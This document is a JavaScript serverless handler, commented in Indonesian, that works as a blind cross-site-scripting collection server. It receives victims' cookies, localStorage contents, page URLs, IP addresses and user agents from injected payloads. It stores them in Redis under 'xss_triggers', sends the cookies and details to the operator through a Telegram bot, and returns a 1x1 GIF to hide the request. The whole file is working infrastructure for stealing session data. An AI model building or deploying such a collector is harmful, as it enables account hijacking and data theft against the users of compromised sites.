import { Redis } from '@upstash/redis';

// Inisialisasi Redis dari environment variables
const redis = Redis.fromEnv();

export default async (req, res) => {
  const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
  const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

  // Ambil data dari GET atau POST
  let marker, url, cookies, userAgent, referer, localStorage, extra;
  if (req.method === 'GET') {
    marker = req.query.marker || req.query.q;
    url = req.query.url;
    cookies = req.query.cookies;
    userAgent = req.query.userAgent;
    referer = req.query.referer;
    localStorage = req.query.localStorage;
    extra = req.query.extra;
  } else if (req.method === 'POST') {
    const body = req.body;
    marker = body.marker;
    url = body.url;
    cookies = body.cookies;
    userAgent = body.userAgent;
    referer = body.referer;
    localStorage = body.localStorage;
    extra = body.extra;
  } else {
    res.setHeader('Allow', ['GET', 'POST']);
    return res.status(405).send('Method Not Allowed');
  }

  // Data trigger
  const triggerData = {
    id: Date.now(),
    marker: marker || 'unknown',
    url: url || referer || 'unknown',
    cookies: cookies || 'none',
    userAgent: userAgent || req.headers['user-agent'] || 'unknown',
    ip: req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'unknown',
    localStorage: localStorage || 'none',
    extra: extra || '',
    timestamp: new Date().toISOString()
  };

  // Simpan ke Redis (gunakan list, push ke depan)
  await redis.lpush('xss_triggers', JSON.stringify(triggerData));
  await redis.ltrim('xss_triggers', 0, 99); // simpan 100 trigger terakhir

  // Kirim notifikasi Telegram
  if (BOT_TOKEN && CHAT_ID && BOT_TOKEN !== 'ISI_TOKEN_BOT_LO') {
    const message = `🔥 *XSS TRIGGERED* 🔥
    
*Marker:* ${marker || 'unknown'}
*URL:* ${triggerData.url}
*Cookies:* ${cookies || 'none'}
*IP:* ${triggerData.ip}
*User-Agent:* ${(userAgent || '').substring(0, 80)}`;

    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: CHAT_ID,
          text: message,
          parse_mode: 'Markdown'
        })
      });
    } catch (err) {
      console.error('Telegram error:', err.message);
    }
  }

  // Balikin gambar 1x1 pixel
  res.setHeader('Content-Type', 'image/gif');
  res.send(Buffer.from('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7', 'base64'));
};
